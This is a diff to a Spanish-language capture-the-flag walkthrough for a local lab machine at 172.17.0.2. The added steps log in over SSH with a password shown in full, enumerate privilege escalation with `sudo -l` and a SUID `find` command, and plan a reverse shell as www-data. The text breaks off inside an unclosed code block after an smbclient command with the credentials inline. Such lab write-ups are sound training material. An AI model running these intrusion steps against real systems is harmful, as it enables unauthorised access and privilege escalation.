@@ -103,15 +103,22 @@ smbclient //172.17.0.2/backup24 -U satriani7
 #### 8. Entraremos mediante SSH al saber el user y la password.
 
 ```bash
-
+ ssh administrador@172.17.0.2
+#passwd: Adm1nP4ss2024
 ```
 
 <img width="856" height="540" alt="image" src="https://github.com/user-attachments/assets/9da8825a-5f23-4da6-a8fd-52f013d6b009" />
 
 
-#### 9. 
+#### 9. AL estar dentro de la máquina ahora buscaremos escalar privilegios mediante los binarios que podemos modificar a root. Primero miraremos con `sudo -l` y si no deja con `find / -perm -4000 -type f 2>/dev/null`.
 
 
+<img width="866" height="364" alt="image" src="https://github.com/user-attachments/assets/50d48f0a-3adc-4103-9330-a048593cae8c" />
+
+
+#### 10. Para la reverse shell que debemos de hacer para entrar con www-data deberemos de descargar la reverse-shell .
+```bash
+smbclient //172.17.0.2/home -U administrador%Adm1nP4ss2024
 
 
 
